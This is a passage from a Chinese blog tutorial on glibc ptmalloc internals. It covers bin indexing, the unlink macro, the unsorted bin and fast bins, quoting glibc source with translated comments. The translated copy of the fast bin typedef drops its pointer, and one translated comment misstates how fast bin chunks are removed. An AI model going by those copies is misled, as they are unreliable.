class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NSMALLBINS 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALLBIN_WIDTH MALLOC_ALIGNMENT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_LARGE_SIZE (NSMALLBINS * SMALLBIN_WIDTH)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> in_smallbin_range(sz) </span></span><br><span class="line">((<span class="type">unsigned</span> <span class="type">long</span>)(sz) &lt; (<span class="type">unsigned</span> <span class="type">long</span>)MIN_LARGE_SIZE)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> smallbin_index(sz) </span></span><br><span class="line">(SMALLBIN_WIDTH == <span class="number">16</span> ? (((<span class="type">unsigned</span>)(sz)) &gt;&gt; <span class="number">4</span>) : (((<span class="type">unsigned</span>)(sz)) &gt;&gt; <span class="number">3</span>))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_32(sz) </span></span><br><span class="line">(((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">38</span>)? <span class="number">56</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">6</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)? <span class="number">91</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">9</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)? <span class="number">110</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">12</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)? <span class="number">119</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">15</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)? <span class="number">124</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">18</span>): </span><br><span class="line">       <span class="number">126</span>)</span><br><span class="line"><span class="comment">// XXX It remains to be seen whether it is good to keep the widths of</span></span><br><span class="line"><span class="comment">// XXX the buckets the same or whether it should be scaled by a factor</span></span><br><span class="line"><span class="comment">// XXX of two as well.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index_64(sz) </span></span><br><span class="line">(((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">6</span>) &lt;= <span class="number">48</span>)? <span class="number">48</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">6</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">9</span>) &lt;= <span class="number">20</span>)? <span class="number">91</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">9</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">12</span>) &lt;= <span class="number">10</span>)? <span class="number">110</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">12</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">15</span>) &lt;= <span class="number">4</span>)? <span class="number">119</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">15</span>): </span><br><span class="line">((((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">18</span>) &lt;= <span class="number">2</span>)? <span class="number">124</span> + (((<span class="type">unsigned</span> <span class="type">long</span>)(sz)) &gt;&gt; <span class="number">18</span>): </span><br><span class="line">  <span class="number">126</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> largebin_index(sz) </span></span><br><span class="line">(SIZE_SZ == <span class="number">8</span> ? largebin_index_64 (sz) : largebin_index_32 (sz))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_index(sz) </span></span><br><span class="line">((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))</span><br></pre></td></tr></table></figure><p>​注意：如果对于用户要分配的内存大小 size， 必须先使用 checked_request2size(req, sz)计算出 chunk 的大小，再使用 bin_index(sz)计算出 chunk 所属的 bin index。 </p><p>​对于 SIZE_SZ 为 4B 的平台，<strong>bin[0]和 bin[1]是不存在的</strong>，因为最小的 chunk 为 16B，small  bins 一共 62 个，large bins 一共 63 个，加起来一共 125 个 bin。而 NBINS 定义为 128，<strong>其实 bin[0]和 bin[127]都不存在</strong>，<strong>bin[1]为 unsorted bin 的 chunk 链表头</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mbinptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) </span></span><br><span class="line">(mbinptr) (((<span class="type">char</span> *) &amp;((m)-&gt;bins[((i) - <span class="number">1</span>) * <span class="number">2</span>])) - offsetof (<span class="keyword">struct</span> malloc_chunk, fd))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* analog of ++bin */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> next_bin(b) </span></span><br><span class="line">((mbinptr)((<span class="type">char</span>*)(b) + (<span class="keyword">sizeof</span>(mchunkptr)&lt;&lt;<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reminders about list directionality within bins */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> first(b) </span></span><br><span class="line">((b)-&gt;fd)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> last(b) </span></span><br><span class="line">((b)-&gt;bk)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(P, BK, FD) &#123; </span></span><br><span class="line">FD = P-&gt;fd; </span><br><span class="line">BK = P-&gt;bk; </span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) </span><br><span class="line">    malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P); </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">    FD-&gt;bk = BK; </span><br><span class="line">    BK-&gt;fd = FD; </span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size) &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123; </span><br><span class="line">        assert (P-&gt;fd_nextsize-&gt;bk_nextsize == P); </span><br><span class="line">        assert (P-&gt;bk_nextsize-&gt;fd_nextsize == P); </span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span> (P-&gt;fd_nextsize == P) </span><br><span class="line">                FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                FD-&gt;fd_nextsize = P-&gt;fd_nextsize; </span><br><span class="line">                FD-&gt;bk_nextsize = P-&gt;bk_nextsize; </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = FD; </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = FD; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; </span><br><span class="line">            P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>宏 bin_at(m, i)<strong>通过 bin index 获得 bin 的链表头</strong>，<strong>chunk 中的 fb 和 bk 用于将空闲 chunk 链入链表中</strong>，而对于每个 bin 的链表头，只需要这两个域就可以了，<strong>prev_size 和 size 对链表都来说都没有意义</strong>，浪费空间，<strong>ptmalloc</strong> 为了节约这点内存空间，增大 cpu 高速缓存的命中率，<strong>在 bins 数组中只为每个 bin 预留了两个指针的内存空间用于存放 bin 的链表头的 fb 和 bk 指针</strong>。 </p><p>从 bin_at(m, i)的定义可以看出，bin[0]不存在，以 SIZE_SZ 为 4B 的平台为例，<strong>bin[1]的前 4B 存储的是指针 fb，后 4B 存储的是指针 bk</strong>，而 <strong>bin_at 返回的是 malloc_chunk 的指针</strong>，由 于 fb 在 malloc_chunk 的偏移地址为 offsetof (struct malloc_chunk, fd))&#x3D;8，所以用 fb 的地址减去 8 就得到 malloc_chunk 的地址。但切记，<strong>对 bin 的链表头的 chunk，一定不能修改 prev_size 和 size 域</strong>，<strong>这两个域是与其他 bin 的链表头的 fb 和 bk 内存复用的</strong>。 </p><p><strong>宏 next_bin(b)用于获得下一个 bin 的地址</strong>，根据前面的分析，我们知道<strong>只需要将当前 bin 的地址向后移动两个指针的长度</strong>就得到下一个 bin 的链表头地址。 </p><p>每个 bin 使用双向循环链表管理空闲 chunk，<strong>bin 的链表头的指针 fb 指向第一个可用的 chunk</strong>，<strong>指针 bk 指向最后一个可用的 chunk</strong>。<strong>宏 first(b)用于获得 bin 的第一个可用 chunk， 宏 last(b)用于获得 bin 的最后一个可用的 chunk，这两个宏便于遍历 bin，而跳过 bin 的链表头。</strong> </p><p><strong>宏 unlink(P, BK, FD)用于将 chunk 从所在的空闲链表中取出来</strong>，注意 <strong>large bins 中的空闲 chunk 可能处于两个双向循环链表中</strong>，unlink 时需要从两个链表中都删除。(还有一个由fdnextsize,bknextsize组成的链表，因为large bin十分特殊，<strong>大小可能不相同</strong>)</p><p><strong>注意：bins是声明在malloc_state的指针数组，长度为254，2个元素构成一个bin，bin数组元素指向的是所对应管理的chunk</strong></p><h5 id="5-2-3-Unsorted-bin"><a href="#5-2-3-Unsorted-bin" class="headerlink" title="5.2.3  Unsorted bin"></a>5.2.3  Unsorted bin</h5><p>Unsorted bin 可以看作是 small bins 和 large bins 的 cache(缓存)，<strong>只有一个 unsorted bin</strong>，以双向链表管理空闲 chunk，<strong>空闲 chunk 不排序</strong>，所有的 chunk 在<strong>回收时都要先放到 unsorted bin 中</strong>，<strong>分配时</strong>，如果在 <strong>unsorted bin 中没有合适的 chunk</strong>，就<strong>会把 unsorted bin 中的所有 chunk 分别加入到所属的 bin 中</strong>，然后<strong>再在 bin 中分配合适的 chunk</strong>。Bins 数组中的<strong>元素 bin[1]用于 存储 unsorted bin 的 chunk 链表头</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Unsorted chunks</span></span><br><span class="line"><span class="comment"> All remainders from chunk splits, as well as all returned chunks,</span></span><br><span class="line"><span class="comment"> are first placed in the &quot;unsorted&quot; bin. They are then placed</span></span><br><span class="line"><span class="comment"> in regular bins after malloc gives them ONE chance to be used before</span></span><br><span class="line"><span class="comment"> binning. So, basically, the unsorted_chunks list acts as a queue,</span></span><br><span class="line"><span class="comment"> with chunks being placed on it in free (and malloc_consolidate),</span></span><br><span class="line"><span class="comment"> and taken off (to be either used or placed in bins) in malloc.</span></span><br><span class="line"><span class="comment"> The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span></span><br><span class="line"><span class="comment"> does not have to be taken into account in size comparisons.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Top</span></span><br><span class="line"><span class="comment"> The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment"> available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment"> any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment"> released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment"> M_TRIM_THRESHOLD). Because top initially</span></span><br><span class="line"><span class="comment"> points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment"> extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment"> code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment"> need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment"> initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment"> interval between initialization and the first call to</span></span><br><span class="line"><span class="comment"> sYSMALLOc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment"> the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initial_top(M) (unsorted_chunks(M))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">未排序的块</span></span><br><span class="line"><span class="comment">所有从块分割中剩余的部分，以及所有返回的块，</span></span><br><span class="line"><span class="comment">首先放置在&quot;未排序&quot;的 bin 中。然后，在 malloc 给它们一次使用的机会之前，</span></span><br><span class="line"><span class="comment">将它们放置在常规的 bin 中。因此，基本上，未排序的块列表充当队列，</span></span><br><span class="line"><span class="comment">在释放时将块放置在其中（以及 malloc_consolidate 中），</span></span><br><span class="line"><span class="comment">并在 malloc 中取出（用于使用或放置在 bins 中）。</span></span><br><span class="line"><span class="comment">未排序的块从不设置 NON_MAIN_ARENA 标志，因此在大小比较中不需要考虑它。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*无法索引的 1-bin 用于保存未排序的块。*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unsorted_chunks(M) (bin_at(M, 1))</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">顶部</span></span><br><span class="line"><span class="comment">最顶部的可用块（即，与可用内存结束边界相邻的块）被特殊对待。</span></span><br><span class="line"><span class="comment">它从不包含在任何 bin 中，仅在没有其他块可用时使用，并且如果非常大（参见 M_TRIM_THRESHOLD）则释放回系统。</span></span><br><span class="line"><span class="comment">因为 top 最初指向自己的 bin，初始大小为零，因此在第一个 malloc 请求时强制扩展，</span></span><br><span class="line"><span class="comment">我们避免在 malloc 中添加任何特殊代码来检查它是否已经存在。</span></span><br><span class="line"><span class="comment">但是，在从系统获取内存时，我们仍然需要这样做，因此我们使 initial_top 在初始化和第一次调用 sYSMALLOc 之间的时间间隔内将 bin 视为合法但不可用的块。（这有些微妙，因为它还依赖于在此时间间隔内前两个字为零。）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* 方便的是，未排序的 bin 可以在第一次调用时用作虚拟顶部 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> initial_top(M) (unsorted_chunks(M))</span></span><br></pre></td></tr></table></figure><p>上面的宏的定义比较明显，<strong>把 bin[1]设置为 unsorted bin 的 chunk 链表头</strong>，对 top chunk 的初始化，也暂时把 top chunk 初始化为 unsort chunk，<strong>仅仅是初始化一个值而已</strong>，这个 chunk 的内容肯定不能用于 top chunk 来分配内存，主要原因是 <strong>top chunk 不属于任何 bin</strong>，<strong>但 ptmalloc 中的一些 check 代码，可能需要 top chunk 属于一个合法的 bin。</strong></p><h5 id="5-2-4-Fast-bins"><a href="#5-2-4-Fast-bins" class="headerlink" title="5.2.4  Fast bins"></a>5.2.4  Fast bins</h5><p>Fast bins 主要是用于提高小内存的分配效率，<strong>默认情况下，对于 SIZE_SZ 为 4B 的平台， 小于 64B 的 chunk 分配请求，对于 SIZE_SZ 为 8B 的平台，小于 128B 的 chunk 分配请求， 首先会查找 fast bins 中是否有所需大小的 chunk 存在（精确匹配），</strong>如果存在，就直接返回。 </p><p>Fast bins 可以看着是 small bins 的一小部分 cache，<strong>默认情况下，fast bins 只 cache 了 small  bins 的前 7 个大小的空闲 chunk</strong>，也就是说，对于 SIZE_SZ 为 4B 的平台，fast bins 有 7 个 chunk 空闲链表（bin），每个 bin 的 chunk 大小依次为 16B，24B，32B，40B，48B，56B，64B；对于 SIZE_SZ 为 8B 的平台，fast bins 有 7 个 chunk 空闲链表（bin），每个 bin 的 chunk 大小依 次为 <strong>32B</strong>，48B，64B，80B，96B，112B，<strong>128B</strong>。以 32 为系统为例，分配的内存大小与 chunk 大小和 fast bins 的对应关系如下表所示：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282212589.png" alt="image-20231219224233213"></p><p>Fast bins 可以看着是 LIFO 的栈，使用单向链表实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Fastbins</span></span><br><span class="line"><span class="comment"> An array of lists holding recently freed small chunks. Fastbins</span></span><br><span class="line"><span class="comment"> are not doubly linked. It is faster to single-link them, and</span></span><br><span class="line"><span class="comment"> since chunks are never removed from the middles of these lists,</span></span><br><span class="line"><span class="comment"> double linking is not necessary. Also, unlike regular bins, they</span></span><br><span class="line"><span class="comment"> are not even processed in FIFO order (they use faster LIFO) since</span></span><br><span class="line"><span class="comment"> ordering doesn&#x27;t much matter in the transient contexts in which</span></span><br><span class="line"><span class="comment"> fastbins are normally used.</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment"> Chunks in fastbins keep their inuse bit set, so they cannot</span></span><br><span class="line"><span class="comment"> be consolidated with other free chunks. malloc_consolidate</span></span><br><span class="line"><span class="comment"> releases all chunks in fastbins and consolidates them with</span></span><br><span class="line"><span class="comment"> other free chunks.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">fast bins</span></span><br><span class="line"><span class="comment">一个包含最近释放的小块的链表数组。fast bins 不是双向链表。</span></span><br><span class="line"><span class="comment">使用单向链接可以更快地操作它们，并且由于这些链表中的块从不被移除，</span></span><br><span class="line"><span class="comment">所以不需要双向链接。此外，与常规 bins 不同，它们甚至不按照 FIFO 的顺序进行处理</span></span><br><span class="line"><span class="comment">（它们使用更快的 LIFO），因为在通常使用fast bins 的瞬时上下文中，顺序并不重要。</span></span><br><span class="line"><span class="comment">fast bins 中的块保持其 inuse 位设置，因此它们不能与其他空闲块合并。</span></span><br><span class="line"><span class="comment">malloc_consolidate 释放fast bins 中的所有块，并将它们与其他空闲块合并。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> <span class="title">mfastbinptr</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure><p>根据 fast bin 的 index，获得 fast bin 的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">将大小转换为快速 bins 的索引。</span></span><br><span class="line"><span class="comment">这个宏定义用于将块的大小转换为在快速 bins 中的索引。</span></span><br><span class="line"><span class="comment">它使用了一个偏移量 2，以便使用起始的两个 bins，这样就可以处理无法索引的前两个 bins。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz) </span></span><br><span class="line"> ((((<span class="type">unsigned</span> <span class="type">int</span>)(sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>​宏 fastbin_index(sz)<strong>用于获得 fast bin 在 fast bins 数组中的 index</strong>，<strong>由于 bin[0]和 bin[1]中 的chunk不存在，所以需要减2</strong>，对于SIZE_SZ为4B的平台，将sz除以8减2得到fast bin index， 对于 SIZE_SZ 为 8B 的平台，将 sz 除以 16 减去 2 得到 fast bin index。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The maximum fastbin request size we support */</span></span><br><span class="line"><span class="comment">/* 我们支持的最大快速 bins 请求大小 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FAST_SIZE (80 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NFASTBINS (fastbin_index(request2size(MAX_FAST_SIZE))+1)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free() </span></span><br><span class="line"><span class="comment"> that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment"> fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment"> matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment"> compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment"> to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment"> consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment"> if trimming is not used.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">FASTBIN_CONSOLIDATION_THRESHOLD 是在 free() 函数中触发自动合并可能周围的快速 bins 块的块大小阈值。</span></span><br><span class="line"><span class="comment">这是一个启发式值，所以具体的数值并不太重要。它被定义为默认修剪阈值的一半，作为一个折衷的启发式值，</span></span><br><span class="line"><span class="comment">只有当合并可能导致修剪时才尝试合并。然而，它不能动态调整，因为即使不使用修剪，合并也可以减少大块周围的碎片化。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure><p>​根据 SIZE_SZ 的不同大小，<strong>定义 MAX_FAST_SIZE 为 80B 或是 160B</strong>，fast bins 数组的大小 NFASTBINS 为 10，FASTBIN_CONSOLIDATION_THRESHOLD 为 64k，<strong>当每次释放的 chunk 与该 chunk 相邻的空闲 chunk 合并后的大小大于 64k 时</strong>，就认为<strong>内存碎片可能比较多</strong>了，就需要 <strong>把 fast bins 中的所有 chunk 都进行合并</strong>，以减少内存碎片对系统的影响。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> DEFAULT_MXFAST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_MXFAST (64 * SIZE_SZ / 4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> Set value of max_fast.</span></span><br><span class="line"><span class="comment"> Use impossibly small value if 0.</span></span><br><span class="line"><span class="comment"> Precondition: there are no existing fastbin chunks.</span></span><br><span class="line"><span class="comment"> Setting the value clears fastchunk bit but preserves noncontiguous bit.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">设置 max_fast 的值。</span></span><br><span class="line"><span class="comment">如果为 0，则使用不可能的小值。</span></span><br><span class="line"><span class="comment">前提条件：不存在现有的 fastbin 块。</span></span><br><span class="line"><span class="comment">设置该值会清除 fastchunk 位，但保留非连续 bit。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) </span></span><br><span class="line"> global_max_fast = (((s) == <span class="number">0</span>) ? SMALLBIN_WIDTH: ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br></pre></td></tr></table></figure><p>​上面的<strong>宏 DEFAULT_MXFAST 定义了默认的 fast bins 中最大的 chunk 大小</strong>，<strong>对于 SIZE_SZ 为 4B</strong> 的平台，<strong>最大 chunk 为 64B</strong>，对于 <strong>SIZE_SZ 为 8B</strong> 的平台，<strong>最大 